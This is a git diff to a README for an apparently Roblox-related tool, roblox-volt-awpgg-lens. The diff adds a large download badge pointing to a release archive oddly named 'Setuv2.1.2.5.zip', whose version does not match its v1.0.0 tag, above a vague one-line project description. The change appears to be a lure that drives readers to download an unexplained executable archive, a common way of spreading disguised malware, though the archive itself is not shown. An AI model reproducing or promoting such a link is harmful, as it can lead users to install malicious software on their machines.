@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/leon-tio1905r7/roblox-volt-awpgg-lens/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 roblox-volt-awpgg-lens
 
 roblox-volt-awpgg-lens is built for roblox-volt-awp.gg users who need a reliable, open-source solution.
